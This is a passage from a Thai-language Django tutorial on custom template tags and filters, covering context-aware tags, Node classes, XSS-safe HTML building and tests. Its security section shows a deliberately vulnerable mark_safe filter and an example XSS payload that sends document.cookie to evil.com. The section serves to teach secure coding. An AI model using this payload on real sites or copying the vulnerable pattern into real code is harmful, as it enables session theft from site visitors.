เทมเพลตอยู่แล้ว — กรณีเหล่านี้ใช้ `takes_context=True`

### 286.2 ตัวอย่างจริง: `active_link` สำหรับทำ Navbar ที่ไฮไลต์เมนูปัจจุบัน

ปัญหาคลาสสิกของทุกเว็บไซต์: navbar ต้องรู้ว่าผู้ใช้กำลังอยู่หน้าไหน เพื่อใส่ class
`active` ให้เมนูที่ตรงกัน โดยไม่อยากส่ง `current_page` เป็น context แยกทุก view
(ผิดหลัก DRY) — ใช้ `takes_context=True` เพื่ออ่าน `request.path` จาก context
โดยตรงแทน:

```python
# blog/templatetags/blog_extras.py (เพิ่มต่อจากเดิม)
from django.urls import reverse, NoReverseMatch


@register.simple_tag(takes_context=True)
def active_link(context, url_name, css_class="active", **url_kwargs):
    """คืน css_class ถ้า URL ปัจจุบันตรงกับ url_name ที่ระบุ ไม่ตรงคืนสตริงว่าง

    ต้องใช้ context processor 'django.template.context_processors.request'
    (มีอยู่แล้วใน TEMPLATES ตั้งแต่ startproject — ทบทวน Part 008 ขั้นตอนที่ 79)
    """
    request = context.get('request')
    if request is None:
        return ""

    try:
        matched_url = reverse(url_name, kwargs=url_kwargs)
    except NoReverseMatch:
        return ""

    return css_class if request.path == matched_url else ""
```

**ข้อสำคัญ**: เมื่อใช้ `takes_context=True` พารามิเตอร์ `context` จะกลาย
เป็น**พารามิเตอร์แรกเสมอ** ก่อน argument อื่นทั้งหมดที่ระบุตอนเรียกใช้ tag —
Django ใส่ให้อัตโนมัติ ไม่ต้องส่งเองตอนเรียกใช้ใน template

ใช้งานใน `partials/navbar.html`:

```html
<!-- templates/partials/navbar.html -->
{% load blog_extras %}
<nav class="navbar">
    <a href="{% url 'blog:list' %}" class="navbar__brand">Django Mastery Blog</a>
    <ul class="navbar__menu">
        <li>
            <a href="{% url 'blog:list' %}" class="{% active_link 'blog:list' %}">
                บทความทั้งหมด
            </a>
        </li>
    </ul>
</nav>
```

### 286.3 `context` คือ Object แบบไหน และเข้าถึงอย่างไร

พารามิเตอร์ `context` ที่ได้รับเป็น instance ของ `django.template.context.
RequestContext` (หรือ `Context` เฉย ๆ ถ้าไม่ได้ render ผ่าน `RequestContext`)
ทำงานคล้าย dictionary ที่ซ้อนกันหลายชั้น (แต่ละชั้นคือแต่ละ `{% with %}` /
`{% for %}` scope ที่ผ่านมา) รองรับ:

```python
@register.simple_tag(takes_context=True)
def debug_context_keys(context):
    # context.flatten() รวมทุกชั้นเป็น dict เดียว มีประโยชน์เวลา debug
    return ", ".join(sorted(context.flatten().keys()))
```

```python
# ตัวอย่างการเข้าถึงค่าจาก context อย่างปลอดภัย
request = context.get('request')       # คืน None ถ้าไม่มี ไม่ raise KeyError
user = context.get('user')
csrf_token = context.get('csrf_token')
```

### 286.4 ข้อควรระวัง: `takes_context=True` ทำให้ Tag พึ่งพาสภาพแวดล้อมมากขึ้น

การใช้ `takes_context=True` มีข้อเสียแฝงที่ควรรู้: tag ที่พึ่งพา context จะ **ทดสอบ
ยากกว่า** (ต้องจำลอง context ที่ถูกต้องก่อนเรียกใช้เสมอ — ดูตัวอย่างในขั้นตอนที่
289) และ **นำไปใช้ซ้ำในโปรเจกต์อื่นยากกว่า** (เพราะผูกกับโครงสร้าง context
เฉพาะของโปรเจกต์นี้) หลักการที่ควรยึดถือ:

> ใช้ `takes_context=True` **เท่าที่จำเป็นจริง ๆ** เท่านั้น — ถ้าข้อมูลที่ต้องการ
> สามารถส่งเป็น argument ตรง ๆ ได้ (เช่น ส่ง `request` เป็น argument แทนที่จะ
> ดึงจาก context) ให้เลือกวิธีนั้นก่อนเสมอ เพราะทำให้ tag ทดสอบง่ายกว่าและอ่าน
> โค้ดในเทมเพลตแล้วรู้ทันทีว่า tag ต้องพึ่งพาอะไรบ้าง

---

## ขั้นตอนที่ 287: ขั้นสูง — เขียน Custom `Node` Class และ Compile Function

### 287.1 เมื่อไหร่ `simple_tag`/`inclusion_tag` ไม่พอ

ทั้ง `simple_tag` และ `inclusion_tag` มีข้อจำกัดร่วมกันอย่างหนึ่ง: มันเป็น tag แบบ
**self-closing** เท่านั้น (`{% my_tag %}` จบในตัวเอง ไม่มีเนื้อหาระหว่างกลาง)
ถ้าคุณต้องการสร้าง tag แบบ **มี opening และ closing** ที่ครอบเนื้อหาไว้ข้างใน
เช่น:

```html
{% mytag %}
    เนื้อหาตรงนี้จะถูกประมวลผลโดย mytag
{% endmytag %}
```

ต้องเขียนแบบ manual โดยสร้าง **`Node` class** เอง และ**ฟังก์ชัน compile** ที่บอก
Django ว่าจะ parse tag นี้จากเทมเพลตอย่างไร — นี่คือกลไกระดับล่างที่
`simple_tag`/`inclusion_tag` สร้างครอบให้อัตโนมัติในขั้นตอนก่อนหน้า

### 287.2 สถาปัตยกรรม 2 ส่วนของ Custom Tag แบบเต็มรูปแบบ

| ส่วน | หน้าที่ | เรียกตอนไหน |
|---|---|---|
| **Compile Function** | รับ token ดิบจากเทมเพลต, parse argument, อ่านเนื้อหาจนกว่าจะเจอ closing tag, คืน `Node` instance | **ตอน parse เทมเพลตครั้งเดียว** (ตอน startup / ครั้งแรกที่โหลดเทมเพลต) |
| **`Node.render(context)`** | รับ context ปัจจุบัน, คืนค่า string ที่จะแสดงผล | **ทุกครั้งที่ render เทมเพลต** (ทุก request) |

การแยก 2 ส่วนนี้คือเหตุผลที่ Django template รันเร็ว: งาน parsing (แพงกว่า) ทำ
แค่ครั้งเดียว ส่วนงาน render (ถูกกว่า) ทำซ้ำได้เร็วทุก request

### 287.3 ตัวอย่างจริง: `{% cache_block %}...{% endcache_block %}`

เราจะสร้าง tag ที่ **cache ผลลัพธ์ของเนื้อหาข้างใน** ไว้ใน Django's low-level
cache framework เป็นระยะเวลาที่กำหนด — มีประโยชน์มากกับส่วนของหน้าเว็บที่คำนวณ
หนักแต่เปลี่ยนแปลงไม่บ่อย (เช่น sidebar หมวดหมู่ยอดนิยม) เราจะเรียนเรื่อง Cache
Framework แบบเต็มใน Phase 9 แต่ในที่นี้ใช้ `django.core.cache.cache` แบบพื้นฐาน
เพื่อสาธิตกลไก `Node`:

```python
# blog/templatetags/blog_extras.py (เพิ่มต่อจากเดิม)
from django import template
from django.core.cache import cache

register = template.Library()


class CacheBlockNode(template.Node):
    """Node ที่ render nodelist ข้างใน {% cache_block %}...{% endcache_block %}
    แล้วเก็บผลลัพธ์ไว้ใน cache ตาม key และเวลาที่กำหนด
    """

    def __init__(self, nodelist, cache_key_expr, timeout_expr):
        self.nodelist = nodelist
        self.cache_key_expr = cache_key_expr
        self.timeout_expr = timeout_expr

    def render(self, context):
        # resolve() แปลง FilterExpression เป็นค่าจริงตาม context ปัจจุบัน
        # (เผื่อ argument เป็นตัวแปร template ไม่ใช่ค่าคงที่ตรง ๆ)
        cache_key = f"cache_block:{self.cache_key_expr.resolve(context)}"
        timeout = int(self.timeout_expr.resolve(context))

        cached_html = cache.get(cache_key)
        if cached_html is not None:
            return cached_html

        # nodelist.render(context) คือขั้นตอนที่ render เนื้อหาทั้งหมด
        # ที่อยู่ระหว่าง {% cache_block %} กับ {% endcache_block %}
        rendered_html = self.nodelist.render(context)
        cache.set(cache_key, rendered_html, timeout)
        return rendered_html


@register.tag(name="cache_block")
def do_cache_block(parser, token):
    """Compile function: เรียกตอน Django parse เทมเพลต (ครั้งเดียว)

    token.split_contents() แตก tag ทั้งบรรทัดเป็น list ของ string
    เช่น "cache_block 'sidebar_categories' 300" จะได้
    ['cache_block', "'sidebar_categories'", '300']
    """
    bits = token.split_contents()
    if len(bits) != 3:
        raise template.TemplateSyntaxError(
            f"{bits[0]} ต้องการ argument 2 ตัว: cache_key และ timeout_seconds"
        )

    tag_name, cache_key_raw, timeout_raw = bits

    # parser.compile_filter() แปลง string argument เป็น FilterExpression
    # ที่ resolve() เป็นค่าจริงได้ตอน render (รองรับทั้งค่าคงที่และตัวแปร)
    cache_key_expr = parser.compile_filter(cache_key_raw)
    timeout_expr = parser.compile_filter(timeout_raw)

    # parser.parse() อ่าน token ต่อไปเรื่อย ๆ จนกว่าจะเจอ tag ชื่อ endcache_block
    # (ไม่รวม endcache_block เข้าไปใน nodelist)
    nodelist = parser.parse(('endcache_block',))

    # ต้อง "กิน" token ปิดทิ้งไปเอง มิฉะนั้น parser จะสับสนว่าเทมเพลตปิด tag ไม่ครบ
    parser.delete_first_token()

    return CacheBlockNode(nodelist, cache_key_expr, timeout_expr)
```

ใช้งานในเทมเพลต:

```html
{% load blog_extras %}

{% cache_block "sidebar_categories" 300 %}
    <aside class="sidebar">
        <h3>หมวดหมู่ยอดนิยม</h3>
        <ul>
            {% for category in categories %}
                <li>{{ category.name }} ({{ category.post_count }})</li>
            {% endfor %}
        </ul>
    </aside>
{% endcache_block %}
```

เนื้อหาข้างในจะถูกคำนวณและ render จริงแค่ครั้งแรก (หรือทุกครั้งที่ cache หมดอายุ
ทุก 300 วินาที) หลังจากนั้น request ถัดไปจะได้ HTML ที่เก็บไว้ทันทีโดยไม่ต้องรัน
`{% for %}` หรือ query ฐานข้อมูลซ้ำเลย

### 287.4 อธิบายทีละขั้นว่า Django Parse Tag แบบมี Closing ได้อย่างไร

```
เทมเพลตต้นฉบับ:
{% cache_block "sidebar_categories" 300 %}
    <aside>...</aside>
{% endcache_block %}

ขั้นตอนการ parse:
1. Parser เจอ token "cache_block ..." → เรียก do_cache_block(parser, token)
2. do_cache_block() แยก argument ด้วย token.split_contents()
3. do_cache_block() เรียก parser.parse(('endcache_block',))
   → parser จะอ่าน token ถัดไปเรื่อย ๆ (ในที่นี้คือ <aside>...</aside>)
   → สร้างเป็น NodeList ธรรมดา จนกว่าจะเจอ token ที่ตรงกับ 'endcache_block'
   → หยุดอ่าน แต่ "ยังไม่กิน" token endcache_block ทิ้ง (เผื่อ tag ซ้อนกันหลายชั้น)
4. do_cache_block() เรียก parser.delete_first_token() เพื่อกิน endcache_block ทิ้งเอง
5. คืน CacheBlockNode(nodelist, ...) กลับไปเป็นส่วนหนึ่งของ Node tree ทั้งหมด

ขั้นตอนตอน render (ทุก request):
1. Django เดิน Node tree ไล่เรียก render(context) ทีละ Node
2. เมื่อถึง CacheBlockNode.render(context) จะเช็ค cache ก่อน
3. ถ้าไม่เจอใน cache → เรียก self.nodelist.render(context)
   → นี่คือจุดที่ <aside>...</aside> ถูก render จริง (รวม {% for %} ข้างใน)
4. เก็บผลลัพธ์ลง cache แล้วคืนค่ากลับ
```

### 287.5 ตารางสรุป API สำคัญที่ใช้เขียน Custom `Node`

| API | อยู่ในส่วนไหน | หน้าที่ |
|---|---|---|
| `token.split_contents()` | Compile function | แตก tag ทั้งบรรทัดเป็น list ของ string โดยเข้าใจ quote (`"..."`) ถูกต้อง |
| `parser.compile_filter(bit)` | Compile function | แปลง string argument เป็น `FilterExpression` ที่ `.resolve(context)` ได้ตอน render |
| `parser.parse((tag_names,))` | Compile function | อ่าน token ต่อไปเรื่อย ๆ จนกว่าจะเจอหนึ่งใน tag ชื่อที่ระบุ คืนเป็น `NodeList` |
| `parser.delete_first_token()` | Compile function | ลบ token ปัจจุบัน (มักใช้ "กิน" closing tag ทิ้งหลัง `parse()`) |
| `nodelist.render(context)` | `Node.render()` | Render เนื้อหาทั้งหมดใน `NodeList` กลับเป็น string ตาม context ปัจจุบัน |
| `expr.resolve(context)` | `Node.render()` | แปลง `FilterExpression` เป็นค่าจริงตาม context ปัจจุบัน |

---

## ขั้นตอนที่ 288: ข้อควรระวังด้านความปลอดภัยเมื่อเขียน Tag/Filter เอง

### 288.1 ทบทวน Auto-Escaping จาก Part 008

ทบทวนจาก Part 008 ขั้นตอนที่ 78: Django **auto-escape** ทุกค่าที่แสดงผลผ่าน
`{{ }}` โดยอัตโนมัติ แปลงอักขระอันตราย เช่น `<`, `>`, `&`, `"`, `'` ให้เป็น HTML
entity เพื่อป้องกัน **XSS (Cross-Site Scripting)** — เมื่อคุณเขียน tag/filter เอง
กลไกนี้**ยังทำงานอยู่โดยอัตโนมัติ** ตราบใดที่คุณไม่ไปปิดมันเอง

### 288.2 จุดอันตรายที่สุด: `mark_safe()`

`mark_safe()` (จาก `django.utils.safestring`) คือฟังก์ชันที่บอก Django ว่า
**"string นี้ปลอดภัย ห้าม escape"** — มันมีประโยชน์จริงเมื่อคุณสร้าง HTML ขึ้นมา
เองใน filter/tag แล้วต้องการให้แสดงเป็น HTML tag จริง (ไม่ใช่ข้อความ escape)
แต่มันคือ **จุดอันตรายที่สุดที่มือใหม่มักเขียนช่องโหว่ XSS โดยไม่รู้ตัว**

```python
# ❌ อันตรายมาก — ห้ามเขียนแบบนี้เด็ดขาด
from django.utils.safestring import mark_safe

@register.filter
def highlight_bad(text, keyword):
    # ถ้า text หรือ keyword มาจาก user input (เช่น comment, search query)
    # โค้ดนี้เปิดช่องให้แฮ็กเกอร์ฝัง <script> เข้ามาได้ทันที!
    highlighted = text.replace(keyword, f"<mark>{keyword}</mark>")
    return mark_safe(highlighted)   # 🚨 บอกให้ไม่ต้อง escape เลย
```

ลองจินตนาการว่า `text` มาจากความคิดเห็นของผู้ใช้ (user-generated content) และมี
ค่าเป็น `<script>alert('hacked')</script>` — โค้ดข้างบนจะ render script tag นั้น
ให้ทำงานจริงในเบราว์เซอร์ของทุกคนที่เข้ามาดูหน้านั้นทันที นี่คือ **Stored XSS**
ที่อันตรายที่สุดประเภทหนึ่ง

### 288.3 วิธีที่ถูกต้อง: `format_html()` แทนการต่อ String เอง + `mark_safe`

Django มีเครื่องมือที่ปลอดภัยกว่าสำหรับสร้าง HTML แบบไดนามิก คือ **`format_html()`**
จาก `django.utils.html` ซึ่ง **escape ค่าที่ใส่เข้าไปให้อัตโนมัติ** แต่ไม่ escape
โครง HTML ที่คุณเขียนเอง:

```python
# ✅ ปลอดภัย — ใช้ format_html() แทน
from django.utils.html import format_html

@register.filter
def highlight_good(text, keyword):
    """ห่อคำที่ตรงกับ keyword ด้วย <mark> โดยปลอดภัยจาก XSS

    format_html() escape ค่าของ {} แต่ละตัวให้อัตโนมัติ (เหมือน str.format
    แต่ปลอดภัยกว่า) ส่วนโครง HTML ("<mark>{}</mark>") ที่เราเขียนเองยังคงอยู่
    """
    if keyword not in text:
        return text

    parts = text.split(keyword)
    # ต่อแต่ละส่วนด้วย format_html_join เพื่อ escape ทุกส่วนอย่างถูกต้อง
    from django.utils.html import format_html_join
    return format_html_join(
        format_html('<mark>{}</mark>', keyword),
        '{}',
        ((part,) for part in parts),
    )
```

หรือกรณีง่ายกว่า — ถ้าแค่ต้องการห่อค่าเดียว ไม่ต้อง split เอง:

```python
@register.filter
def wrap_badge(value, css_class="badge"):
    """ห่อค่าด้วย <span class="..."> อย่างปลอดภัย"""
    return format_html('<span class="{}">{}</span>', css_class, value)
```

`format_html('<span class="{}">{}</span>', css_class, value)` จะ escape ทั้ง
`css_class` และ `value` ให้อัตโนมัติก่อนแทรกเข้าไปในโครง HTML — ต่างจากการเขียน
`f'<span class="{css_class}">{value}</span>'` แล้ว `mark_safe()` ทับ ซึ่งจะไม่
escape อะไรเลย

### 288.4 ตารางเปรียบเทียบวิธีสร้าง HTML แบบไดนามิกใน Tag/Filter

| วิธี | Escape ให้อัตโนมัติไหม | ควรใช้เมื่อ |
|---|---|---|
| `return value` (string ธรรมดา) | ✅ Django auto-escape ตอนแสดงผล | ค่าที่คืนเป็นข้อความล้วน ไม่มี HTML tag |
| `format_html(template, *args)` | ✅ escape ทุก argument ให้อัตโนมัติ | ต้องการสร้าง HTML ที่มีโครงสร้าง tag แต่แทรกค่าจากตัวแปร |
| `format_html_join(sep, template, args_list)` | ✅ escape ทุกตัวในลูป | สร้าง HTML ซ้ำ ๆ จาก list/queryset (เช่น สร้าง `<li>` หลายอัน) |
| `mark_safe(string)` | ❌ ไม่ escape เลย | **เฉพาะ**เมื่อ string นั้นมาจากแหล่งที่เชื่อถือได้ 100% (เช่น hardcode ในโค้ด ไม่มีส่วนใดมาจาก user input) |
| `conditional_escape(value)` | เช็คก่อนว่า escape ไปแล้วหรือยัง | ใช้ตอนเขียน `Node.render()` เองที่รับ context ทั่วไปมา ไม่รู้ล่วงหน้าว่าปลอดภัยหรือยัง |

### 288.5 กฎเหล็ก 4 ข้อสำหรับเขียน Tag/Filter อย่างปลอดภัย

1. **อย่าใช้ `mark_safe()` กับข้อมูลที่มาจาก user input โดยตรงหรือโดยอ้อมเด็ดขาด**
   ไม่ว่าจะเป็นฟอร์ม, URL parameter, ฐานข้อมูล (ที่ผู้ใช้เคยกรอกไว้), หรือ API
   ภายนอก — ถือว่า "ไม่ปลอดภัย" ทั้งหมดจนกว่าจะพิสูจน์ได้ว่าปลอดภัยจริง
2. **ใช้ `format_html()`/`format_html_join()` แทนการต่อ string เองเสมอ** เมื่อ
   ต้องสร้าง HTML ที่มีค่าจากตัวแปรแทรกอยู่ข้างใน
3. **Filter ที่ประกาศ `is_safe=True` ต้องพิสูจน์ได้จริงว่าไม่มีทางสร้าง HTML แปลก
   ปลอมได้** (เช่น `truncate_smart` ในขั้นตอนที่ 283 ปลอดภัยเพราะแค่ตัด string
   ไม่ได้เติม tag ใด ๆ) ถ้า filter มีโอกาสสร้าง/แก้ไข HTML tag ห้ามใส่
   `is_safe=True` เด็ดขาด — ปล่อยให้ Django escape ตามปกติ
4. **เมื่อรับ `content` ที่เป็น HTML ที่ผ่านการ sanitize มาแล้ว** (เช่น จาก Rich
   Text Editor ที่กรอง tag อันตรายออกแล้ว — จะเรียนเต็มใน Phase 5) ให้ทำเครื่องหมาย
   ปลอดภัยที่**ต้นทาง** (ตอน sanitize เสร็จ) ไม่ใช่ที่ filter/tag ปลายทาง เพื่อให้
   จุดที่ตัดสินใจว่า "ปลอดภัยแล้ว" มีที่เดียวชัดเจน ตรวจสอบง่าย

### 288.6 ตัวอย่างการโจมตีจริงถ้าทำผิดพลาด (เพื่อความเข้าใจ ไม่ใช่เพื่อลอกเลียน)

```python
# สถานการณ์สมมติ: filter นี้ใช้แสดงชื่อผู้แสดงความคิดเห็น
@register.filter
def bad_display_name(comment):
    # comment.author_name มาจากฟอร์มที่ผู้ใช้กรอกเอง ไม่ผ่านการตรวจสอบ
    return mark_safe(f"<strong>{comment.author_name}</strong>")
```

ถ้าผู้ใช้กรอกชื่อเป็น:

```
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

ทุกคนที่เปิดหน้าที่แสดงความคิดเห็นนี้จะรัน JavaScript ที่ขโมย cookie (รวมถึง
session ของ admin) ส่งไปยังเซิร์ฟเวอร์ของแฮ็กเกอร์ทันที — นี่คือเหตุผลที่ Django
เลือก **auto-escape เป็นค่าเริ่มต้นเสมอ** และทำไมการปิดมันด้วย `mark_safe()` ต้อง
ทำด้วยความระมัดระวังสูงสุด

---

## ขั้นตอนที่ 289: การเขียนเทสต์สำหรับ Custom Template Tag/Filter

### 289.1 3 ระดับของการเทสต์ Custom Tag/Filter

| ระดับ | ทดสอบอะไร | เครื่องมือ |
|---|---|---|
| 1. Unit test ฟังก์ชัน Python ตรง ๆ | ตรรกะภายในฟังก์ชัน โดยไม่ผ่าน template engine เลย | เรียกฟังก์ชันตรง ๆ เหมือนฟังก์ชัน Python ทั่วไป |
| 2. Render ผ่าน `Template` + `Context` | ว่า tag/filter ทำงานถูกต้องเมื่อถูกเรียกผ่าน syntax จริงของ DTL | `django.template.Template`, `django.template.Context` |
| 3. Integration ผ่าน view จริง | ว่าเทมเพลตทั้งหน้าที่ใช้ tag/filter render ออกมาถูกต้อง | `self.client.get(...)`, `assertContains()` |

หลักการคือ **เริ่มจากระดับที่เร็วและง่ายที่สุดก่อนเสมอ** (ระดับ 1) แล้วค่อยเพิ่ม
ระดับ 2-3 เฉพาะจุดที่จำเป็นต้องมั่นใจว่า syntax การเรียกใช้จริงในเทมเพลตถูกต้อง
ด้วย (เราจะเรียน Testing แบบเต็มรูปแบบใน Phase 7 แต่ในที่นี้ใช้พื้นฐานเท่าที่
จำเป็นก่อนได้)

### 289.2 ระดับ 1: Unit Test ฟังก์ชัน Python ตรง ๆ

เพราะ `simple_tag` และ `filter` **คือฟังก์ชัน Python ธรรมดา** (decorator แค่ห่อ
เพิ่มความสามารถให้ tag เท่านั้น) คุณเรียกมันเทสต์ตรง ๆ ได้เลยโดยไม่ต้องยุ่งกับ
template engine ทำให้เทสต์กลุ่มนี้**เร็วที่สุดและเขียนง่ายที่สุด**:

```python
# blog/tests/test_templatetags.py
from django.test import SimpleTestCase

from blog.templatetags.blog_extras import reading_time, truncate_smart


class ReadingTimeTagTests(SimpleTestCase):
    def test_short_content_returns_at_least_one_minute(self):
        result = reading_time("สั้น ๆ แค่นี้")
        self.assertEqual(result, "1 นาที")

    def test_long_content_calculates_correct_minutes(self):
        content = " ".join(["คำ"] * 600)   # 600 คำ ที่ 200 คำ/นาที = 3 นาที
        result = reading_time(content)
        self.assertEqual(result, "3 นาที")

    def test_custom_words_per_minute(self):
        content = " ".join(["คำ"] * 500)
        result = reading_time(content, words_per_minute=250)
        self.assertEqual(result, "2 นาที")


class TruncateSmartFilterTests(SimpleTestCase):
    def test_short_text_unchanged(self):
        self.assertEqual(truncate_smart("สั้น", 100), "สั้น")

    def test_long_text_gets_truncated_with_ellipsis(self):
        text = "Django Template Language is powerful and flexible for developers"
        result = truncate_smart(text, 30)
        self.assertTrue(result.endswith("…"))
        self.assertLessEqual(len(result), 31)   # 30 + เครื่องหมาย …

    def test_does_not_cut_word_in_the_middle(self):
        text = "Django Template Language is powerful"
        result = truncate_smart(text, 20)
        # ผลลัพธ์ต้องไม่มีคำที่ถูกตัดครึ่งอย่าง "Languag…" ค้างอยู่
        self.assertFalse(result.rstrip("…").endswith("Languag"))
```

`SimpleTestCase` (จาก `django.test`) เหมาะกับเทสต์กลุ่มนี้เพราะไม่ต้องแตะ
ฐานข้อมูลเลย ทำให้รันเร็วกว่า `TestCase` ทั่วไปมาก (เราจะเรียนความแตกต่างเต็ม
รูปแบบใน Phase 7)

### 289.3 ระดับ 2: Render ผ่าน `Template` และ `Context` จริง

การเทสต์ระดับนี้สำคัญเพราะมัน**ยืนยันว่า syntax ที่คุณสอนไว้ในเอกสาร/comment
ใช้งานได้จริง** — บางครั้งฟังก์ชัน Python ถูกต้อง แต่การลงทะเบียนกับ `register`
ผิดพลาด (เช่น ลืม `{% load %}`, ตั้งชื่อ tag ผิด) ซึ่งเทสต์ระดับ 1 จับไม่ได้เลย:

```python
# blog/tests/test_templatetags.py (เพิ่มต่อจากเดิม)
from django.template import Context, Template
from django.test import SimpleTestCase


class ReadingTimeTagRenderingTests(SimpleTestCase):
    def render(self, template_string, context_dict):
        template = Template(template_string)
        return template.render(Context(context_dict))

    def test_tag_renders_correctly_through_dtl_syntax(self):
        output = self.render(
            "{% load blog_extras %}{% reading_time content %}",
            {"content": " ".join(["คำ"] * 400)},
        )
        self.assertEqual(output, "2 นาที")

    def test_tag_works_with_as_variable(self):
        output = self.render(
            "{% load blog_extras %}"
            "{% reading_time content as rt %}"
            "เวลาอ่าน: {{ rt }}",
            {"content": " ".join(["คำ"] * 200)},
        )
        self.assertEqual(output, "เวลาอ่าน: 1 นาที")

    def test_output_is_autoescaped(self):
        # ยืนยันว่าค่าที่ผ่าน filter/tag ยังคง auto-escape ตามปกติ
        output = self.render(
            "{% load blog_extras %}{{ value|truncate_smart:50 }}",
            {"value": "<script>alert(1)</script>"},
        )
        self.assertNotIn("<script>", output)
        self.assertIn("&lt;script&gt;", output)
```

test ตัวสุดท้าย (`test_output_is_autoescaped`) สำคัญมาก — มันคือเทสต์ด้าน
**ความปลอดภัย** ที่ยืนยันว่า filter ของเราไม่ได้ทำอะไรที่เปิดช่องให้ XSS หลุดผ่าน
ควรเขียนเทสต์ลักษณะนี้ไว้กับ**ทุก** filter/tag ที่รับข้อมูลจากภายนอกได้

### 289.4 เทสต์ Tag ที่ใช้ `takes_context=True`

Tag ที่ต้องอ่าน context (เช่น `active_link` จากขั้นตอนที่ 286) ต้องจำลอง
`RequestContext` ที่มี `request` อยู่ข้างในให้ถูกต้องก่อนเทสต์ได้ ใช้
`RequestFactory` ช่วยสร้าง fake request:

```python
# blog/tests/test_templatetags.py (เพิ่มต่อจากเดิม)
from django.template import RequestContext
from django.test import RequestFactory, SimpleTestCase
from django.urls import reverse


class ActiveLinkTagTests(SimpleTestCase):
    def setUp(self):
        self.factory = RequestFactory()

    def render_with_request(self, template_string, path):
        request = self.factory.get(path)
        template = Template(template_string)
        return template.render(RequestContext(request, {}))

    def test_active_link_matches_current_path(self):
        list_url = reverse('blog:list')
        output = self.render_with_request(
            "{% load blog_extras %}{% active_link 'blog:list' %}",
            path=list_url,
        )
        self.assertEqual(output, "active")

    def test_active_link_does_not_match_other_path(self):
        output = self.render_with_request(
            "{% load blog_extras %}{% active_link 'blog:list' %}",
            path="/some/other/path/",
        )
        self.assertEqual(output, "")
```

`django.template` ต้อง import `Template` ไว้ในไฟล์นี้ด้วย (`from django.template
import Template`) ถ้ายังไม่มีจากตอนก่อนหน้า

### 289.5 เทสต์ `inclusion_tag` ด้วยการเช็ค HTML ที่ Render ออกมา

```python
# blog/tests/test_templatetags.py (เพิ่มต่อจากเดิม)
from django.test import TestCase   # ใช้ TestCase เพราะต้องสร้าง object ในฐานข้อมูล

from blog.models import Post


class RenderPostCardTagTests(TestCase):
    def setUp(self):
        self.post = Post.objects.create(
            title="ทดสอบ Custom Template Tag",
            slug="test-custom-template-tag",
            content="เนื้อหาสำหรับทดสอบ " * 10,
            is_published=True,
        )

    def test_post_card_renders_title_and_link(self):
        template = Template(
            "{% load blog_extras %}{% render_post_card post %}"
        )
        output = template.render(Context({'post': self.post}))

        self.assertIn(self.post.title, output)
        self.assertIn(self.post.get_absolute_url(), output)

    def test_post_card_highlight_class_appears_when_true(self):
        template = Template(
            "{% load blog_extras %}{% render_post_card post highlight=True %}"
        )
        output = template.render(Context({'post': self.post}))

        self.assertIn("post-card--highlight", output)

    def test_post_card_highlight_class_absent_by_default(self):
        template = Template(
            "{% load blog_extras %}{% render_post_card post %}"
        )
        output = template.render(Context({'post': self.post}))

        self.assertNotIn("post-card--highlight", output)
```

### 289.6 รันเทสต์ทั้งหมด

```bash
python manage.py test blog.tests.test_templatetags
```

ผลลัพธ์ที่คาดหวัง:

```
Creating test database for alias 'default'...
..............
----------------------------------------------------------------------
Ran 14 tests in 0.087s

OK
Destroying test database for alias 'default'...
```

### 289.7 หลักการที่ควรยึดถือเมื่อเทสต์ Custom Tag/Filter

- **เทสต์ทั้ง happy path และ edge case เสมอ**: ข้อความว่าง, ค่า `None`, ตัวเลข
  ติดลบ, ข้อความที่สั้นกว่า/ยาวกว่า limit พอดี
- **เทสต์กรณี auto-escape เสมอ** สำหรับ tag/filter ที่รับข้อมูลจากภายนอกได้ —
  นี่คือเทสต์ด้านความปลอดภัยที่ป้องกัน regression ไม่ให้ใครมาแก้โค้ดแล้วเผลอเปิด
  ช่องโหว่ XSS ในอนาคตโดยไม่รู้ตัว
- **แยกเทสต์ระดับ 1 (unit) กับระดับ 2-3 (integration) ให้ชัดเจน** เพื่อให้เมื่อ
  เทสต์ล้มเหลว รู้ทันทีว่าปัญหาอยู่ที่ตรรกะภายในฟังก์ชัน หรืออยู่ที่การเชื่อมต่อ
  กับ template engine

---

## ขั้นตอนที่ 290: สรุปและแบบฝึกหัด

### 290.1 ไฟล์ `blog_extras.py` ฉบับสมบูรณ์หลังจบ Part นี้

รวมทุกอย่างที่สร้างมาตลอด Part นี้เข้าเป็นไฟล์เดียว:

```python
# blog/templatetags/blog_extras.py
from django import template
from django.core.cache import cache
from django.urls import reverse, NoReverseMatch
from django.utils.html import format_html

from blog.models import Post

register = template.Library()


# ---- ขั้นตอนที่ 282: simple_tag พื้นฐาน ----
@register.simple_tag
def reading_time(content, words_per_minute=200):
    word_count = len(content.split())
    minutes = max(1, round(word_count / words_per_minute))
    return f"{minutes} นาที"


# ---- ขั้นตอนที่ 283: custom filter ที่รับ argument ----
@register.filter(name="truncate_smart", is_safe=True)
def truncate_smart(value, limit=100):
    value = str(value)
    limit = int(limit)
    if len(value) <= limit:
        return value
    truncated = value[:limit]
    last_space = truncated.rfind(" ")
    if last_space > limit * 0.6:
        truncated = truncated[:last_space]
    return truncated.rstrip() + "…"


# ---- ขั้นตอนที่ 284: inclusion_tag ----
@register.inclusion_tag('blog/_post_card.html')
def render_post_card(post, highlight=False, show_reading_time=True):
    return {
        'post': post,
        'highlight': highlight,
        'show_reading_time': show_reading_time,
    }


# ---- ขั้นตอนที่ 285: simple_tag ที่ใช้กับ `as` ----
@register.simple_tag
def get_related_posts(post, count=3):
    return (
        Post.objects.filter(is_published=True)
        .exclude(pk=post.pk)
        .order_by('-created_at')[:count]
    )


# ---- ขั้นตอนที่ 286: takes_context=True ----
@register.simple_tag(takes_context=True)
def active_link(context, url_name, css_class="active", **url_kwargs):
    request = context.get('request')
    if request is None:
        return ""
    try:
        matched_url = reverse(url_name, kwargs=url_kwargs)
    except NoReverseMatch:
        return ""
    return css_class if request.path == matched_url else ""


# ---- ขั้นตอนที่ 287: custom Node แบบมี opening/closing ----
class CacheBlockNode(template.Node):
    def __init__(self, nodelist, cache_key_expr, timeout_expr):
        self.nodelist = nodelist
        self.cache_key_expr = cache_key_expr
        self.timeout_expr = timeout_expr

    def render(self, context):
        cache_key = f"cache_block:{self.cache_key_expr.resolve(context)}"
        timeout = int(self.timeout_expr.resolve(context))
        cached_html = cache.get(cache_key)
        if cached_html is not None:
            return cached_html
        rendered_html = self.nodelist.render(context)
        cache.set(cache_key, rendered_html, timeout)
        return rendered_html


@register.tag(name="cache_block")
def do_cache_block(parser, token):
    bits = token.split_contents()
    if len(bits) != 3:
        raise template.TemplateSyntaxError(
